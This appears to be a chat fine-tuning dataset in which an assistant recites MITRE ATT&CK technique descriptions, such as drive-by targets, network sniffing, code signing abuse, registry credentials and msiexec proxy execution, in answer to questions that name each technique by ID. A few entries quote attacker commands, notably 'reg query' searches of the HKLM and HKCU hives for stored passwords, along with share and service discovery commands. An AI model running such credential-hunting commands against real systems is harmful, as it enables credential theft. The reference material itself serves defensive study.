{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Drive-by Target' and with the Id: T1608.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Drive-by Target' and with the Id: T1608.004 is described as follows: Adversaries may prepare an operational environment to infect systems that visit a website over the normal course of browsing. Endpoint systems may be compromised through browsing to adversary controlled sites, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). In such cases, the user's web browser is typically targeted for exploitation (often not requiring any extra user interaction once landing on the site), but adversaries may also set up websites for non-exploitation behavior such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001). Prior to [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), adversaries must stage resources needed to deliver that exploit to users who browse to an adversary controlled site. Drive-by content can be staged on adversary controlled infrastructure that has been acquired ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or previously compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).Adversaries may upload or inject malicious web content, such as [JavaScript](https://attack.mitre.org/techniques/T1059/007), into websites.(Citation: FireEye CFR Watering Hole 2012)(Citation: Gallagher 2015) This may be done in a number of ways, including:* Inserting malicious scripts into web pages or other user controllable web content such as forum posts* Modifying script files served to websites from publicly writeable cloud storage buckets* Crafting malicious web advertisements and purchasing ad space on a website through legitimate ad providers (i.e., [Malvertising](https://attack.mitre.org/techniques/T1583/008))In addition to staging content to exploit a user's web browser, adversaries may also stage scripting content to profile the user's browser (as in [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592)) to ensure it is vulnerable prior to attempting exploitation.(Citation: ATT ScanBox)Websites compromised by an adversary and used to stage a drive-by may be ones visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is referred to a strategic web compromise or watering hole attack.Adversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ([Domains](https://attack.mitre.org/techniques/T1583/001)) to help facilitate [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'System Service Discovery' and with the Id: T1007 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'System Service Discovery' and with the Id: T1007 is described as follows: Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as <code>sc query</code>, <code>tasklist /svc</code>, <code>systemctl --type=service</code>, and <code>net start</code>.Adversaries may use the information from [System Service Discovery](https://attack.mitre.org/techniques/T1007) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.. The systems targeted by this attack pattern are: Windows, macOS, Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Network Sniffing' and with the Id: T1040 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Network Sniffing' and with the Id: T1040 is described as follows: Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.Network sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.In cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)On network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software). The systems targeted by this attack pattern are: Linux, macOS, Windows, Network, IaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Application Deployment Software' and with the Id: T1017 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Application Deployment Software' and with the Id: T1017 is described as follows: Adversaries may deploy malicious software to systems within a network using application deployment systems employed by enterprise administrators. The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the deployment server, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform software deployment.Access to a network-wide or enterprise-wide software deployment system enables an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Code Signing' and with the Id: T1553.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Code Signing' and with the Id: T1553.002 is described as follows: Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) The certificates used during an operation may be created, acquired, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates) Unlike [Invalid Code Signature](https://attack.mitre.org/techniques/T1036/001), this activity will result in a valid signature.Code signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing)(Citation: EclecticLightChecksonEXECodeSigning)Code signing certificates may be used to bypass security policies that require signed code to execute on a system. . The systems targeted by this attack pattern are: macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Data from Cloud Storage' and with the Id: T1530 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Data from Cloud Storage' and with the Id: T1530 is described as follows: Adversaries may access data from cloud storage.Many IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. In some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). Adversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.This open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)Adversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.. The systems targeted by this attack pattern are: IaaS, SaaS, Google Workspace, Office 365 ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Runtime Data Manipulation' and with the Id: T1565.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Runtime Data Manipulation' and with the Id: T1565.003 is described as follows: Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making.Adversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct [Change Default File Association](https://attack.mitre.org/techniques/T1546/001) and [Masquerading](https://attack.mitre.org/techniques/T1036) to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Credentials in Registry' and with the Id: T1552.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Credentials in Registry' and with the Id: T1552.002 is described as follows: Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.Example commands to find Registry keys related to password information: (Citation: Pentestlab Stored Credentials)* Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code>* Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Network Share Discovery' and with the Id: T1135 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Network Share Discovery' and with the Id: T1135 is described as follows: Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. File sharing over a Windows network occurs over the SMB protocol. (Citation: Wikipedia Shared Resource) (Citation: TechNet Shared Folder) [Net](https://attack.mitre.org/software/S0039) can be used to query a remote system for available shared drives using the <code>net view \\\\\\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>. For macOS, the <code>sharing -l</code> command lists all shared points used for smb services.. The systems targeted by this attack pattern are: macOS, Windows, Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Peripheral Device Discovery' and with the Id: T1120 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Peripheral Device Discovery' and with the Id: T1120 is described as follows: Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system.(Citation: Peripheral Discovery Linux)(Citation: Peripheral Discovery macOS) Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.. The systems targeted by this attack pattern are: Windows, macOS, Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Break Process Trees' and with the Id: T1036.009 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Break Process Trees' and with the Id: T1036.009 is described as follows: An adversary may attempt to evade process tree-based analysis by modifying executed malware's parent process ID (PPID). If endpoint protection software leverages the \u201cparent-child\" relationship for detection, breaking this relationship could result in the adversary\u2019s behavior not being associated with previous process tree activity. On Unix-based systems breaking this process tree is common practice for administrators to execute software using scripts and programs.(Citation: 3OHA double-fork 2022) On Linux systems, adversaries may execute a series of [Native API](https://attack.mitre.org/techniques/T1106) calls to alter malware's process tree. For example, adversaries can execute their payload without any arguments, call the `fork()` API call twice, then have the parent process exit. This creates a grandchild process with no parent process that is immediately adopted by the `init` system process (PID 1), which successfully disconnects the execution of the adversary's payload from its previous process tree.Another example is using the \u201cdaemon\u201d syscall to detach from the current parent process and run in the background.(Citation: Sandfly BPFDoor 2022)(Citation: Microsoft XorDdos Linux Stealth 2022) . The systems targeted by this attack pattern are: Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Network Topology' and with the Id: T1590.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Network Topology' and with the Id: T1590.004 is described as follows: Adversaries may gather information about the victim's network topology that can be used during targeting. Information about network topologies may include a variety of details, including the physical and/or logical arrangement of both external-facing and internal network environments. This information may also include specifics regarding network devices (gateways, routers, etc.) and other infrastructure.Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about network topologies may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: DNS Dumpster) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Code Signing Certificates' and with the Id: T1587.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Code Signing Certificates' and with the Id: T1587.002 is described as follows: Adversaries may create self-signed code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.(Citation: Wikipedia Code Signing) Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.Prior to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may develop self-signed code signing certificates for use in operations.. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Windows File and Directory Permissions Modification' and with the Id: T1222.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Windows File and Directory Permissions Modification' and with the Id: T1222.001 is described as follows: Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).Windows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).(Citation: Microsoft DACL May 2018) Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.(Citation: Microsoft Access Control Lists May 2018)Adversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, [PowerShell](https://attack.mitre.org/techniques/T1059/001) provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Add-ins' and with the Id: T1137.006 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Add-ins' and with the Id: T1137.006 is described as follows: Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs. (Citation: Microsoft Office Add-ins) There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. (Citation: MRWLabs Office Persistence Add-ins)(Citation: FireEye Mail CDS 2018)Add-ins can be used to obtain persistence because they can be set to execute code when an Office application starts. . The systems targeted by this attack pattern are: Windows, Office 365 ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Transport Agent' and with the Id: T1505.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Transport Agent' and with the Id: T1505.002 is described as follows: Adversaries may abuse Microsoft transport agents to establish persistent access to systems. Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails.(Citation: Microsoft TransportAgent Jun 2016)(Citation: ESET LightNeuron May 2019) Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks. Adversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events.(Citation: ESET LightNeuron May 2019) Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary. . The systems targeted by this attack pattern are: Linux, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'System Information Discovery' and with the Id: T1082 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'System Information Discovery' and with the Id: T1082 is described as follows: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Tools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather detailed system information (e.g. <code>show version</code>).(Citation: US-CERT-TA18-106A) [System Information Discovery](https://attack.mitre.org/techniques/T1082) combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.(Citation: OSX.FairyTale)(Citation: 20 macOS Common Tools and Techniques)Infrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API). The systems targeted by this attack pattern are: Windows, IaaS, Linux, macOS, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Application Layer Protocol' and with the Id: T1071 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Application Layer Protocol' and with the Id: T1071 is described as follows: Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. Adversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP.(Citation: Mandiant APT29 Eye Spy Email Nov 22) . The systems targeted by this attack pattern are: Linux, macOS, Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'AppDomainManager' and with the Id: T1574.014 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'AppDomainManager' and with the Id: T1574.014 is described as follows: Adversaries may execute their own malicious payloads by hijacking how the .NET `AppDomainManager` loads assemblies. The .NET framework uses the `AppDomainManager` class to create and manage one or more isolated runtime environments (called application domains) inside a process to host the execution of .NET applications. Assemblies (`.exe` or `.dll` binaries compiled to run as .NET code) may be loaded into an application domain as executable code.(Citation: Microsoft App Domains) Known as \"AppDomainManager injection,\" adversaries may execute arbitrary code by hijacking how .NET applications load assemblies. For example, malware may create a custom application domain inside a target process to load and execute an arbitrary assembly. Alternatively, configuration files (`.config`) or process environment variables that define .NET runtime settings may be tampered with to instruct otherwise benign .NET applications to load a malicious assembly (identified by name) into the target process.(Citation: PenTestLabs AppDomainManagerInject)(Citation: PwC Yellow Liderc)(Citation: Rapid7 AppDomain Manager Injection). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Remote Data Staging' and with the Id: T1074.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Remote Data Staging' and with the Id: T1074.002 is described as follows: Adversaries may stage data collected from multiple systems in a central location or directory on one system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and stage data in that instance.(Citation: Mandiant M-Trends 2020)By staging data on one system prior to Exfiltration, adversaries can minimize the number of connections made to their C2 server and better evade detection.. The systems targeted by this attack pattern are: Windows, IaaS, Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Additional Container Cluster Roles' and with the Id: T1098.006 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Additional Container Cluster Roles' and with the Id: T1098.006 is described as follows: An adversary may add additional roles or permissions to an adversary-controlled user or service account to maintain persistent access to a container orchestration system. For example, an adversary with sufficient permissions may create a RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes account.(Citation: Kubernetes RBAC)(Citation: Aquasec Kubernetes Attack 2023) Where attribute-based access control (ABAC) is in use, an adversary with sufficient permissions may modify a Kubernetes ABAC policy to give the target account additional permissions.(Citation: Kuberentes ABAC) This account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised.  Note that where container orchestration systems are deployed in cloud environments, as with Google Kubernetes Engine, Amazon Elastic Kubernetes Service, and Azure Kubernetes Service, cloud-based  role-based access control (RBAC) assignments or ABAC policies can often be used in place of or in addition to local permission assignments.(Citation: Google Cloud Kubernetes IAM)(Citation: AWS EKS IAM Roles for Service Accounts)(Citation: Microsoft Azure Kubernetes Service Service Accounts) In these cases, this technique may be used in conjunction with [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).. The systems targeted by this attack pattern are: Containers ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Scheduled Task/Job' and with the Id: T1053 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Scheduled Task/Job' and with the Id: T1053 is described as follows: Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.(Citation: TechNet Task Scheduler Security)Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.(Citation: ProofPoint Serpent). The systems targeted by this attack pattern are: Windows, Linux, macOS, Containers ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Msiexec' and with the Id: T1218.007 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Msiexec' and with the Id: T1218.007 is described as follows: Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).(Citation: Microsoft msiexec) The Msiexec.exe binary may also be digitally signed by Microsoft.Adversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.(Citation: LOLBAS Msiexec)(Citation: TrendMicro Msiexec Feb 2018) Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the <code>AlwaysInstallElevated</code> policy is enabled.(Citation: Microsoft AlwaysInstallElevated 2018). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Login Item' and with the Id: T1162 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Login Item' and with the Id: T1162 is described as follows: MacOS provides the option to list specific applications to run when a user logs in. These applications run under the logged in user's context, and will be started every time the user logs in. Login items installed using the Service Management Framework are not visible in the System Preferences and can only be removed by the application that created them (Citation: Adding Login Items). Users have direct control over login items installed using a shared file list which are also visible in System Preferences (Citation: Adding Login Items). These login items are stored in the user's <code>~/Library/Preferences/</code> directory in a plist file called <code>com.apple.loginitems.plist</code> (Citation: Methods of Mac Malware Persistence). Some of these applications can open visible dialogs to the user, but they don\u2019t all have to since there is an option to \u2018Hide\u2019 the window. If an adversary can register their own login item or modified an existing one, then they can use it to execute their code for a persistence mechanism each time the user logs in (Citation: Malware Persistence on OS X) (Citation: OSX.Dok Malware). The API method <code> SMLoginItemSetEnabled </code> can be used to set Login Items, but scripting languages like [AppleScript](https://attack.mitre.org/techniques/T1155) can do this as well  (Citation: Adding Login Items).. The systems targeted by this attack pattern are: macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Network Trust Dependencies' and with the Id: T1590.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Network Trust Dependencies' and with the Id: T1590.003 is described as follows: Adversaries may gather information about the victim's network trust dependencies that can be used during targeting. Information about network trusts may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access.Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about network trusts may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: Pentesting AD Forests) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).. The systems targeted by this attack pattern are: PRE ."}]}
